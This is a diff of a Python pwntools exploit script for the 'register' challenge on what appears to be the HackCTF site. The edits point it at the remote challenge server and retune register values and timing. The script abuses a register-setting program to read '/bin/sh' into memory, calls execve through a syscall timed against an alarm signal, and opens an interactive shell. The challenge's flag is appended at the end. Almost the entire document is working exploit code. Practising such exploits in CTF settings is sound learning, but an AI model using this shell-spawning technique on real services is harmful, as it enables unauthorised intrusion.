@@ -1,6 +1,7 @@
 from pwn import * 
 
-p = process("./register")
+#p = process("./register")
+p = remote("ctf.j0n9hyun.xyz",3026)
 #gdb.attach(p)
 #print register's name, input somewhere.
 # get_ll func getting input into stack, through atoi funcion, input values changed 
@@ -24,30 +25,30 @@ p.sendlineafter("RAX:",str(0))	#rax
 p.sendlineafter("RDI:",str(0))	#rdi
 p.sendlineafter("RSI:",str(bss))	#rsi
 p.sendlineafter("RDX:",str(8))		#rdx
-
-p.sendlineafter("RCX:",str(1))
-p.sendlineafter("R8:",str(2))
-p.sendlineafter("R9:",str(3))
+p.sendlineafter("RCX:",str(0))
+p.sendlineafter("R8:",str(0))
+p.sendlineafter("R9:",str(0))
 
 log.info("first step end\n")
-p.sendline("/bin/sh\x00")
+p.send("/bin/sh\x00")
 
 # for call execve(bss,0,0) => rax: 3b ,rdi :bss, rsi : 0 , rdx : 0 
 # i have to set time . if rax = 0x3b, syscall will not called. 
 # so, send valid rax value and send execve before getting signal from raise().
 # alarm() func call every 5 sec. so, execve send - signal will have 5 sec term.
-sleep(4.8)
+# so i should find right timing and set sleep. 
+sleep(4.4)
 
 p.sendlineafter("RAX:",str(0x3b))	#rax
 p.sendlineafter("RDI:",str(bss))	#rdi
 p.sendlineafter("RSI:",str(0))	#rsi
 p.sendlineafter("RDX:",str(0))		#rdx
-
-p.sendlineafter("RCX:",str(1))
-p.sendlineafter("R8:",str(2))
-p.sendlineafter("R9:",str(3))
+p.sendlineafter("RCX:",str(0))
+p.sendlineafter("R8:",str(0))
+p.sendlineafter("R9:",str(0))
 log.info("final end\n")
 
 p.interactive()
 
 
+#HackCTF{6316964770251056468501091137477179868692}
